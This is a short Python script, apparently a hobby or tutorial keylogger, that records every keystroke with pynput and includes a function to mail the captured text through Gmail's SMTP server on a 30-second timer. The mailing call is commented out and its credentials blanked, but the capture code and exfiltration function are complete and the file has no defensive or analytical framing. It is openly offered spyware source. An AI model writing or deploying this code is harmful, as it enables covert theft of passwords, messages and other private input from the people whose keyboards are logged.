import pynput.keyboard
import threading
import smtplib

log = ""

def callback_function(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " " + str(key) + " "

def send_email(email, password, message):
    if message:  # Send email only if there are logged keys
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
        print("Email sent!")

def thread_function():
    global log
    #send_email("", log)   redacted
    log = ""
    timer_object = threading.Timer(30, thread_function)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

with keylogger_listener:
    thread_function()
    keylogger_listener.join()